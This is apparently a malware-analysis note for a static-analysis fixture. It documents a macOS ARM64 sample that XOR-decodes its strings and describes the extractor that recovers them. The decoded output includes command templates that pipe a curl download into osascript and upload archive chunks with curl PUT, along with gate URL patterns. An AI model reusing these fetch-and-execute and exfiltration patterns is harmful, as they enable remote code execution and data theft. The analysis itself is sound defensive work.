# ARM64 repeating-key XOR uploader

Static-analysis fixture, 69152 bytes. SHA-256:
`4a187d1d3dcc1e684a3a9e7bade340d032d6b77a7a232067eb55f85685c971ca`.
Source: triage40's March 2026 datalake.abuse.ch Mach-O collection.
The sample was not executed and its endpoints were not contacted.

The helper at VA `0x1000010f8` XORs `x0[i]` with `x1[i % x3]` for
`i < x2`. Main calls it 17 times with four-byte keys constructed by MOVZ,
MOVK, and stack stores. Ciphertext is copied from `__TEXT,__const` using
scalar/vector loads and stores; a verified imported memcpy copies the
342-byte upload command. Some short values and buffer tails use immediates.

The extractor requires the complete helper body, tracks only the supported
literal initialization grammar, requires every ciphertext/key byte to be
initialized, and rejects overlapping key and ciphertext buffers. Unsupported
instructions and unknown calls invalidate state. It resolves the memcpy stub
through the Mach-O import binding. It performs no key search or execution.

Work limits: 1 MiB code section, 16 matching helpers, 512 folded calls,
8 KiB tracked stack, 4096-byte literals, 32-byte keys, 64 KiB decoded output.
The large tracking arrays are allocated only after the helper signature matches.
Generation tags make state invalidation constant-time. Evidence spans cover
the literal construction instructions through each decode call in the original
file. These limits are not a production-throughput measurement.

All 14 literals at least four characters long agree with independent constant
reconstruction. `%d`, `r`, and `w` are below the default length threshold.
Representative output:

- `curl ... -H "api-key: %s" "%s" | osascript`
- `dd if=%s bs=1 skip=%ld count=%ld ... | curl ... -X PUT --data-binary @- ...`
- `%s://%s/gate?buildtxd=%s&upload_id=%s&chunk_index=%d&total_chunks=%d`
- `%s://%s/dynamic?txd=%s&pwd=%s`
- `/tmp/osalogging.zip`

Main forks, creates a session, redirects standard streams to `/dev/null`,
probes the remote script endpoint, and executes its response with osascript.
It forwards argv[1] into `pwd` when present; no password prompt is implemented
in this executable. It uploads the ZIP in 10 MiB chunks, accepting HTTP
200–299. Each failed chunk is attempted at most eight times, with sleeps of
5, 7, ..., 19 seconds. Success removes the archive; retry exhaustion leaves it.
The remote AppleScript and archive contents are absent from this specimen.

Full static reconstruction and instruction evidence are retained under
`/var/tmp/triage40/review/macho-xor-upload/`.
